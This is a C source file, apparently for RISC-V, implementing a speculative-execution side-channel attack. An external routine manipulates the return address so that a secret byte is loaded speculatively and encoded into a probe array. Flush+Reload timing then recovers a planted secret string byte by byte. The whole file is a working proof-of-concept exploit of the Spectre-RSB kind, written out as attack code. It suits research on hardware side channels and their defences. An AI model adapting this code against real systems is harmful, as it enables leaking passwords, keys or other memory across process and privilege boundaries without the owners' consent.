#include <stdio.h>
#include <stdint.h>

#define CACHE_HIT_THRESHOLD 50      // Threshold (in cycles) to determine a cache hit
#define ATTACK_SAME_ROUNDS 10       // Number of times to repeat the attack for each byte for reliability
#define SECRET_SZ 5                 // The size of the secret string

// Probe array used for the side-channel attack (Flush+Reload)
uint8_t array[256 * L1_BLOCK_SZ_BYTES];
// The secret string the attack aims to recover
char* secretString = "ThisIsTheSecretString";

// This function is expected to manipulate control flow or processor state.
extern void frameDump(void);

/**
 * @brief Function designed to trigger speculative execution after calling frameDump.
 * Calls frameDump (which manipulates RA), then speculatively loads a secret byte
 * and uses it to access the probe 'array', caching a line based on the secret value.
 * @param addr Address of the secret byte to leak.
 */
void specFunc(char *addr){
    uint64_t dummy = 0; // Dummy variable

    // Call the external assembly function (expected to manipulate state, e.g., return address)
    frameDump();

    // ---- Code below might execute speculatively ----
    char secret = *addr; // Speculatively load the secret byte.
    // Use the secret byte to index into the probe array, caching the corresponding line.
    dummy = array[secret * L1_BLOCK_SZ_BYTES];
    // ---- End of likely speculative execution ----

    dummy = rdcycle(); // Consume dummy value, potentially add delay or barrier.
    (void)dummy; // Avoid unused variable warning
}


int main(void){

    // Array to store the count of cache hits for each possible byte value (0-255)
    static uint64_t results[256];
    uint64_t start, diff; // Variables for timing measurements
    uint8_t dummy = 0;    // Dummy variable to prevent compiler optimizing out array reads

    char guessedSecret[SECRET_SZ + 1]; // Buffer for the recovered secret + null terminator

    printf("Starting speculative execution attack...\n");

    // Iterate through each byte of the secret string
    for(uint64_t i = 0; i < SECRET_SZ; i++) {

        // Reset hit counters for all possible byte values before attacking the next byte
        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx) {
            results[cIdx] = 0;
        }

        // Repeat the attack multiple times for the same secret byte to improve reliability
        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound) {

            // Flush the probe array from the cache (Flush phase of Flush+Reload)
            flushCache((uint64_t)array, sizeof(array));

            // Call the function that triggers speculative execution via frameDump
            specFunc(secretString + i); // Pass address of current secret byte

            // Restore the frame pointer (fp). This is often needed after complex function calls
            // or assembly sequences that might modify the stack state unexpectedly, ensuring
            // the rest of the main function's stack frame is valid.
            __asm__ volatile ("ld fp, -16(sp)");

            // Probe phase: Time the access to each element of the probe array.
            // A cache hit (fast access) indicates that this index might correspond
            // to the speculatively loaded secret byte value.
            for (uint64_t probe_idx = 0; probe_idx < 256; ++probe_idx){ // Use probe_idx to avoid shadowing
                    uint8_t* current_addr = &array[probe_idx * L1_BLOCK_SZ_BYTES];
                    start = rdcycle();          // Read time before access
                    dummy &= *current_addr;     // Access the array element; use &= to ensure access isn't optimized out
                    diff = (rdcycle() - start); // Calculate access time

                    // If access time is below the threshold, it's likely a cache hit
                    if (diff < CACHE_HIT_THRESHOLD) {
                        results[probe_idx] += 1; // Increment the hit counter for this byte value
                    }
            }
        } // End attack rounds loop

        // Find the byte value (index) with the most cache hits.
        // This is the most likely value for the current secret byte.
        uint64_t max_hits = 0;
        uint64_t guessed_index = 0;
        for (uint64_t idx = 0; idx < 256; idx++) { // Use idx to avoid shadowing outer loop i
            if (results[idx] > max_hits) {
                max_hits = results[idx];
                guessed_index = idx;
            }
        }

        // Print the guess for the current secret byte position
        printf("The attacker guessed character '%c' (0x%02lx) for index %lu with %ld hits.\n",
               (char)guessed_index, guessed_index, i, max_hits);

        // Store the guessed byte
        guessedSecret[i] = (char)guessed_index;

    } // End secret byte loop

    // Null-terminate the guessed secret string
    guessedSecret[SECRET_SZ] = '\0';

    // Print the final result
    printf("\nThe guessed secret is: %s\n", guessedSecret);
    printf("Original secret was: %s\n", secretString);

    return 0;
}